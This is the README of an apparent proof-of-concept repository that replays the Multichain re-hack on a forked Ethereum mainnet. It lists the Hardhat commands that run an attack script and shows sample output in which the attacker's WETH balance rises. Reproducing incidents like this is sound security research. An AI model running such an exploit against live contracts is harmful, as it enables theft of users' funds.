# Multichain re-hack PoC

## How to run

Install nodejs/yarn first

Set up the `forking url` (in `hardhat.config.js`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/eth/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
yarn install
yarn hardhat run scripts/attack.js
```
You will see similar output later
```
Exploit contract deployed to: 0xab16A69A5a8c12C732e0DEFF4BE56A70bb64c926
WETH balance of attacker : 0.0
Exploiting... transcation:  0xc7e58e8da702e25e25fdc8370ab200347ff257466c0493a05885b40c6207f59b
Exploit complete.
WETH balance of attacker : 0.2
```
This means the attack is complete
> The block height of the fork is 14028473


## Link

* https://twitter.com/PeckShieldAlert/status/1483363515411099651
* https://www.tofreedom.me/multichain
